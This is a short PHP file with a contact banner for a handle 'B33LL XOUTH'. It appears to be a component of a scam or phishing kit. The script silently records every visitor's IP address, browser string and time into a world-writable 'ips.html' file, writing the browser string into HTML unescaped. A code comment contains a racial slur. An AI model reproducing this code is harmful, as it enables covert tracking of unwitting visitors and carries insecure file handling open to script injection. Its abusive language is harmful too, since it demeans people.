<?php
#<!--
#---------------------||-||---------------------#
#        #===============================#
#        #         By B33LL XOUTH        #
#        #         Icq: B33LL_XOUTH      #
#        #        Telegram: @BELL_SOUTH  #
#        #       bell_south@aol.com      #
#        #        fb.com/b33ll.xouth     #
#        #         -Contact Me Here-     #
#        #===============================#                     
#
#---------------------||-||---------------------#
#-->
?>
<?php
//Don't Touch This Nigga
$iplogfile = 'ips.html';
$ipaddress = $_SERVER['REMOTE_ADDR'];
$timestamp = date('d/m/Y h:i:s');
$browser = $_SERVER['HTTP_USER_AGENT'];
$fp = fopen($iplogfile, 'a+');
chmod($iplogfile, 0777);
fwrite($fp, '['.$timestamp.']: '.$ipaddress.' '.$browser. "\n<br><br>");
fclose($fp);
?>